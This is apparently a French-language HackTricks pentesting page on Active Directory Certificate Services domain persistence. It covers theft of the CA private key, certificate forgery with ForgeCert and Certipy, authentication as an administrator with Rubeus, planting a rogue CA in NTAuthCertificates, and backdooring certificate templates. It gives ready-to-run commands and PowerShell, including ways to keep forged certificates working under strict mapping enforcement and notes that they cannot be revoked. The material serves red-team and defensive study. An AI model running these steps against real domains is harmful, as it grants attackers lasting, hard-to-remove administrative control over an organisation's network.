# AD CS Persistance de domaine

{{#include ../../../banners/hacktricks-training.md}}

**Ceci est un résumé des techniques de persistance de domaine présentées dans [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Consultez-le pour plus de détails.

## Falsification de certificats avec des certificats CA volés - DPERSIST1

How can you tell that a certificate is a CA certificate?

On peut déterminer qu'un certificat est un certificat CA si plusieurs conditions sont remplies :

- Le certificat est stocké sur le serveur CA, sa clé privée étant protégée par le DPAPI de la machine, ou par du matériel tel qu'un TPM/HSM si le système d'exploitation le prend en charge.
- Les champs Issuer et Subject du certificat correspondent tous deux au nom distinctif (distinguished name) de la CA.
- Une extension "CA Version" est présente exclusivement dans les certificats CA.
- Le certificat n'a pas de champs Extended Key Usage (EKU).

Pour extraire la clé privée de ce certificat, l'outil `certsrv.msc` sur le serveur CA est la méthode prise en charge via l'interface graphique intégrée. Néanmoins, ce certificat ne diffère pas des autres stockés dans le système ; des méthodes telles que la [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) peuvent donc être utilisées pour l'extraction.

Le certificat et la clé privée peuvent également être obtenus avec Certipy en utilisant la commande suivante :
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Après avoir acquis le certificat CA et sa clé privée au format `.pfx`, des outils comme [ForgeCert](https://github.com/GhostPack/ForgeCert) peuvent être utilisés pour générer des certificats valides :
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> L'utilisateur ciblé pour la falsification de certificat doit être actif et capable de s'authentifier dans Active Directory pour que le processus réussisse. Falsifier un certificat pour des comptes spéciaux comme krbtgt est inefficace.

Ce certificat falsifié sera **valide** jusqu'à la date de fin spécifiée et tant que **le certificat de la CA racine est valide** (généralement de 5 à **10+ ans**). Il est aussi valable pour les **machines**, donc combiné avec **S4U2Self**, un attaquant peut **maintenir la persistance sur n'importe quelle machine de domaine** aussi longtemps que le certificat CA est valide.\
De plus, les **certificats générés** avec cette méthode **ne peuvent pas être révoqués** puisque la CA n'en a pas connaissance.

### Fonctionnement sous l'application stricte du mapping des certificats (2025+)

Depuis le 11 février 2025 (après le déploiement de KB5014754), les contrôleurs de domaine sont par défaut en **Full Enforcement** pour les mappings de certificats. Concrètement, cela signifie que vos certificats falsifiés doivent soit :

- Contenir un lien fort avec le compte cible (par exemple, l'extension de sécurité SID), ou
- Être associés à un mapping fort et explicite sur l'attribut `altSecurityIdentities` de l'objet cible.

Une approche fiable pour la persistance consiste à créer un certificat falsifié chaîné à l'Enterprise CA volée puis à ajouter un mapping explicite et fort au principal victime :
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Remarques
- Si vous pouvez forger des certificats qui incluent le SID security extension, ceux-ci se mapperont implicitement même en Full Enforcement. Sinon, privilégiez des mappings explicites et robustes. Voir [account-persistence](account-persistence.md) pour plus d'informations sur les mappings explicites.
- La révocation n'aide pas les défenseurs ici : les certificats forgés sont inconnus de la base de données de la CA et ne peuvent donc pas être révoqués.

## Trusting Rogue CA Certificates - DPERSIST2

L'objet `NTAuthCertificates` est défini pour contenir un ou plusieurs **certificats CA** dans son attribut `cacertificate`, utilisé par Active Directory (AD). Le processus de vérification par le **contrôleur de domaine** consiste à vérifier l'objet `NTAuthCertificates` pour une entrée correspondant à la **CA spécifiée** dans le champ Issuer du **certificat** authentifiant. L'authentification se poursuit si une correspondance est trouvée.

Un certificat CA auto-signé peut être ajouté à l'objet `NTAuthCertificates` par un attaquant, à condition qu'il contrôle cet objet AD. Normalement, seuls les membres du groupe **Enterprise Admin**, ainsi que les **Domain Admins** ou les **Administrators** dans le **domaine racine de la forêt**, disposent de l'autorisation de modifier cet objet. Ils peuvent éditer l'objet `NTAuthCertificates` en utilisant `certutil.exe` avec la commande `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, ou en employant le [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Additional helpful commands for this technique:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Cette capacité est particulièrement pertinente lorsqu'elle est utilisée conjointement avec une méthode précédemment exposée impliquant ForgeCert pour générer dynamiquement des certificats.

> Considérations de cartographie post-2025 : placer une CA rogue dans NTAuth n'établit la confiance qu'à l'égard de la CA émettrice. Pour utiliser des certificats leaf pour la connexion lorsque les DCs sont en **Full Enforcement**, le leaf doit soit contenir l'extension de sécurité SID soit il doit exister un mappage explicite fort sur l'objet cible (par exemple, Issuer+Serial dans `altSecurityIdentities`). Voir {{#ref}}account-persistence.md{{#endref}}.

## Malicious Misconfiguration - DPERSIST3

Les opportunités de **persistence** via des modifications de descripteurs de sécurité des composants AD CS sont nombreuses. Les modifications décrites dans la section "[Domain Escalation](domain-escalation.md)" peuvent être mises en œuvre de manière malveillante par un attaquant disposant d'un accès élevé. Cela inclut l'ajout de "control rights" (par ex., WriteOwner/WriteDACL/etc.) sur des composants sensibles tels que :

- L'objet **AD computer** du **CA server**
- Le **RPC/DCOM server** du **CA server**
- Tout **objet AD descendant ou conteneur** dans **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (par exemple, le conteneur Certificate Templates, le conteneur Certification Authorities, l'objet NTAuthCertificates, etc.)
- **Des groupes AD délégués pour contrôler AD CS** par défaut ou par l'organisation (comme le groupe intégré Cert Publishers et n'importe lequel de ses membres)

Un exemple d'implémentation malveillante impliquerait qu'un attaquant, ayant des **permissions élevées** dans le domaine, ajoute la permission **`WriteOwner`** au template de certificat par défaut **`User`**, en se mettant lui-même comme principal pour ce droit. Pour exploiter cela, l'attaquant changerait d'abord la propriété du template **`User`** pour se l'attribuer. Ensuite, le **`mspki-certificate-name-flag`** serait défini sur **1** sur le template pour activer **`ENROLLEE_SUPPLIES_SUBJECT`**, permettant à un utilisateur de fournir un Subject Alternative Name dans la requête. Par la suite, l'attaquant pourrait **enroll** en utilisant le **template**, choisissant un nom d'**administrateur de domaine** comme nom alternatif, et utiliser le certificat acquis pour s'authentifier en tant que DA.

Réglages pratiques qu'un attaquant peut définir pour une persistence long terme dans le domaine (voir {{#ref}}domain-escalation.md{{#endref}} pour les détails complets et la détection) :

- Flags de politique CA permettant les SAN depuis les requérants (par ex., activation de `EDITF_ATTRIBUTESUBJECTALTNAME2`). Cela maintient exploitables des chemins de type ESC1.
- DACL du template ou paramètres permettant une émission capable d'authentification (par ex., ajout de Client Authentication EKU, activation de `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Contrôler l'objet `NTAuthCertificates` ou les conteneurs CA pour réintroduire en continu des émetteurs rogue si les défenseurs tentent un nettoyage.

> [!TIP]
> Dans des environnements durcis post-KB5014754, associer ces mauvaises configurations à des mappages explicites forts (`altSecurityIdentities`) garantit que vos certificats émis ou forgés restent utilisables même lorsque les DCs appliquent un mappage strict.



## References

- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
{{#include ../../../banners/hacktricks-training.md}}
